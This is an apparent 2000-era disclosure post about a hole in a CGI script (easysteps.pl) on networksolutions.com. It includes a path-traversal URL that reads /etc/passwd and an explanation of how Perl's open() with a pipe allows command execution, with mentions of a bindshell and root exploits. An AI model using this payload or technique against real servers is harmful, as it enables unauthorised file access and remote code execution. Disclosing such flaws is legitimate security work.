networksolutions.com: www security hole. (may/9/2000)

Major security issue with networksolutions.com(easysteps.pl).  I was in 
#r00tabega, and someone relayed this(it was told to me Mr^Chaos found the
orginal read bug):

http://www.networksolutions.com/cgi-bin/makechanges/easysteps/easysteps.pl?STRING=maymun.com&FILE=/../../../../../../../etc/passwd

And I so with that initial bug found, I downloaded the perl script with the bug
itself.  I noticed that a bigger problem existed:

---

open(CURR_FILE,$finalpath) or die "EASYSTEPS: Can't open file $finalpath\n";
  my @LINES = <CURR_FILE>;
close(CURR_FILE);

---

$finalpath is for the most part supplied by the user.  Knowning that open() can
be used to execute programs, I used the initial bug for this, by going to 
the root dir and then accessing the file I wanted to execute followed by the
pipe:

I decided NOT to be retarded.  But, I could have wrote a bindshell to a tmp
directory and connected.  While looking around the system I noticed some
public exploits that would have been able to get me root.

I just thought this was worth commenting on of a major corp, with
such a obvious bug. (I don't want to goto jail, I don't know about you.)
